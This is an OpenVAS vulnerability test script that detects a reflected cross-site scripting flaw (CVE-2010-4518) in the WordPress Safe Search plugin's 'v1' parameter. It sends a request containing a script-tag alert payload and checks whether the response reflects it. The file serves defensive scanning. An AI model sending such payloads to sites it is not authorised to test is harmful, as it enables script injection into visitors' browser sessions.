##############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Safe Search Plugin 'v1' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801490");
  script_version("2023-03-01T10:20:04+0000");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2010-12-21 15:42:46 +0100 (Tue, 21 Dec 2010)");
  script_cve_id("CVE-2010-4518");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress Safe Search Plugin 'v1' Parameter Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42544");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45267");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/WordPress.Safe.Search.0.7.Reflected.Cross-site.Scripting/66");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in context of an affected site.");
  script_tag(name:"affected", value:"WordPress Safe Search Plugin 0.7 and prior");
  script_tag(name:"insight", value:"The input passed to 'v1' parameter in
'wp-content/plugins/wp-safe-search/wp-safe-search-jx.php' script is not
properly sanitised before being returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"WordPress is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/wp-safe-search/wp-safe-search-jx.php?v1=<script>alert(XSS-Testing)</script>";
req = http_get(item:url, port:port);
res = http_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(XSS-Testing)</script>" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
